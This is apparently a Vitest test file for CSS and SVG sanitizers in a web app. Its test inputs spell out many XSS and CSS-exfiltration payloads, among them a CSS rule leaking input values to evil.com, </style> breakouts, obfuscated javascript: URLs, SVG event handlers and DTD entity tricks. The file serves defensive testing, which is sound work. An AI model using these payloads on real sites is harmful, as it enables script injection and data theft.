import { describe, it, expect } from 'vitest'
import { sanitizeThemeCss, sanitizeSvg } from '../../server/utils/sanitize-css-svg'

describe('Theme CSS Sanitization (sanitizeThemeCss)', () => {
  it('leaves ordinary declarative CSS untouched', () => {
    const css = `:root { --nuxflow-primary: #00dc82; } .card { border-radius: 8px; padding: 1rem; }`
    expect(sanitizeThemeCss(css)).toBe(css)
  })

  it('strips url() everywhere, closing the attribute-selector exfiltration vector', () => {
    const css = `input[value^="a"] { background: url(https://evil.com/?leak=a); }`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('evil.com')
    expect(result).toContain('background: none')
  })

  it('strips url() regardless of quoting style', () => {
    expect(sanitizeThemeCss(`a { background: url("https://evil.com/x.png"); }`)).not.toContain('evil.com')
    expect(sanitizeThemeCss(`a { background: url('https://evil.com/x.png'); }`)).not.toContain('evil.com')
    expect(sanitizeThemeCss(`a { background: url(https://evil.com/x.png); }`)).not.toContain('evil.com')
  })

  // Regression: a naive `url\([^)]*\)` stops at the FIRST ')', so a quoted data: URI
  // containing a literal ')' inside its own value (routine for inline SVG — rgba()/
  // matrix()/translate() and similar) only has its prefix replaced with 'none', leaving
  // the true remainder of the value — including the real closing ')' and trailing ';' —
  // as unescaped garbage text that corrupts the stylesheet from that point on. Caught by
  // diffing production theme CSS: a mask-image data: URI containing `rgba(...)` produced
  // exactly this — a mangled declaration whose garbage tail read like
  // `none'/%3E%3C/svg%3E");`, breaking every rule after it in the browser's parser.
  it('cleanly strips a quoted url() value that contains a literal ) inside the quotes', () => {
    const css = `.icon { mask-image: url('data:image/svg+xml,%3Csvg fill="rgba(0,0,0,0.5)"%3E%3C/svg%3E'); } .after { color: red; }`
    const result = sanitizeThemeCss(css)
    expect(result).toContain('mask-image: none')
    expect(result).not.toContain('rgba')
    expect(result).not.toMatch(/none['")]/) // no leftover quote/paren garbage stuck to 'none'
    // The rule *after* the mangled one must survive intact — this is what a parser-desync
    // bug would silently break.
    expect(result).toContain('.after { color: red; }')
  })

  it('cleanly strips a double-quoted url() value containing a literal )', () => {
    const css = `a { background-image: url("data:image/svg+xml,%3Cpath transform='matrix(1,0,0,1,0,0)'/%3E"); }`
    const result = sanitizeThemeCss(css)
    expect(result).toBe(`a { background-image: none; }`)
  })

  it('strips @import statements entirely', () => {
    const css = `@import url(https://evil.com/tracker.css);\nbody { color: red; }`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('@import')
    expect(result).not.toContain('evil.com')
    expect(result).toContain('body { color: red; }')
  })

  it('strips @import with a quoted string form', () => {
    const css = `@import "https://evil.com/tracker.css";\nbody { color: red; }`
    expect(sanitizeThemeCss(css)).not.toContain('evil.com')
  })

  it('strips constructs hidden inside comments before matching', () => {
    const css = `@im/* hide */port url(https://evil.com/x.css);`
    const result = sanitizeThemeCss(css)
    expect(result).not.toContain('evil.com')
  })

  it('strips legacy IE expression()', () => {
    const css = `.x { width: expression(alert(1)); }`
    expect(sanitizeThemeCss(css)).not.toMatch(/expression\s*\(/)
  })

  it('strips </style> to prevent breaking out of the injected style block', () => {
    const css = `body {}</style><script>alert(1)</script><style>`
    expect(sanitizeThemeCss(css)).not.toContain('</style>')
  })

  it('is idempotent — sanitizing already-clean CSS twice produces the same output', () => {
    const css = `:root { --nuxflow-primary: #00dc82; }`
    const once = sanitizeThemeCss(css)
    const twice = sanitizeThemeCss(once)
    expect(twice).toBe(once)
  })
})

// Every variant an HTML parser accepts as the end of a <style> element. Escaping each `<`
// (rather than stripping one spelling of `</style>`) means none can ever form.
describe('sanitizeThemeCss — <style> breakout', () => {
  const payloads = [
    'a{}</style ><img src=x onerror=alert(1)>',
    'a{}</style/x><script>alert(1)</script>',
    'a{}</STYLE\n><script>alert(1)</script>',
    'a{}</sty</style>le><script>alert(1)</script>',
    String.raw`a{}\3c /style><script>alert(1)</script>`,
  ]
  for (const css of payloads) {
    it(`never emits a raw "<" for ${JSON.stringify(css)}`, () => {
      expect(sanitizeThemeCss(css)).not.toContain('<')
    })
  }

  it('keeps "<" meaningful to CSS as an escape inside string values', () => {
    expect(sanitizeThemeCss('a::before{content:"<3"}')).toBe(String.raw`a::before{content:"\3c 3"}`)
  })
})

describe('SVG Sanitization (sanitizeSvg)', () => {
  const NS = 'xmlns="http://www.w3.org/2000/svg"'

  it('keeps ordinary drawing markup intact', () => {
    const svg = `<svg ${NS} viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" fill="#0f0"/></svg>`
    expect(sanitizeSvg(svg)).toBe(svg)
  })

  it('removes a <script> reassembled from pieces around a removed one', () => {
    const out = sanitizeSvg(`<svg ${NS}><scr<script></script>ipt>alert(1)</scr<script></script>ipt></svg>`)
    expect(out).not.toMatch(/<\s*script/i)
  })

  it('removes namespace-prefixed script elements', () => {
    const out = sanitizeSvg(`<svg ${NS}><h:script xmlns:h="http://www.w3.org/1999/xhtml">alert(1)</h:script></svg>`)
    expect(out).not.toMatch(/script/i)
  })

  it('removes an unclosed <script> tag', () => {
    expect(sanitizeSvg(`<svg ${NS}><script>alert(1)`)).not.toMatch(/<script/i)
  })

  it('removes foreignObject (embedded HTML)', () => {
    const out = sanitizeSvg(`<svg ${NS}><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>`)
    expect(out).not.toMatch(/foreignObject|iframe/i)
  })

  it('removes event handlers regardless of separator or quoting', () => {
    for (const svg of [
      `<svg ${NS} onload="alert(1)"/>`,
      `<svg ${NS}\nonload='alert(1)'/>`,
      `<svg ${NS}/onload=alert(1)>`,
      `<svg ${NS}><circle ONMOUSEOVER="alert(1)"/></svg>`,
    ]) {
      expect(sanitizeSvg(svg)).not.toMatch(/on(load|mouseover)/i)
    }
  })

  it('removes javascript: URLs, including entity-encoded and control-char-split schemes', () => {
    for (const href of [
      'javascript:alert(1)',
      '&#106;avascript:alert(1)',
      '&#x6A;avascript:alert(1)',
      'java&#x09;script:alert(1)',
      ' javascript:alert(1)',
      'javascript&colon;alert(1)',
    ]) {
      const out = sanitizeSvg(`<svg ${NS}><a href="${href}"><text>x</text></a></svg>`)
      expect(out).not.toContain('href=')
    }
  })

  it('removes SMIL animations that would set an href to a script URL', () => {
    const out = sanitizeSvg(`<svg ${NS}><a><animate attributeName="href" values="#;javascript:alert(1)"/><text>x</text></a></svg>`)
    expect(out).not.toContain('javascript')
  })

  it('keeps raster data: URIs but drops other data: URIs', () => {
    expect(sanitizeSvg(`<svg ${NS}><image href="data:image/png;base64,AAAA"/></svg>`)).toContain('href="data:image/png')
    expect(sanitizeSvg(`<svg ${NS}><a href="data:text/html,<script>alert(1)</script>"/></svg>`)).not.toContain('href=')
  })

  it('removes DTD entity declarations that could expand into markup', () => {
    const out = sanitizeSvg(`<!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]><svg ${NS}>&x;</svg>`)
    expect(out).not.toMatch(/DOCTYPE|ENTITY/i)
  })

  it('removes xml-stylesheet processing instructions', () => {
    const out = sanitizeSvg(`<?xml-stylesheet type="text/xsl" href="evil.xsl"?><svg ${NS}/>`)
    expect(out).not.toContain('xml-stylesheet')
  })

  it('is idempotent', () => {
    const once = sanitizeSvg(`<svg ${NS} onload="x"><scr<script></script>ipt>1</script></svg>`)
    expect(sanitizeSvg(once)).toBe(once)
  })
})
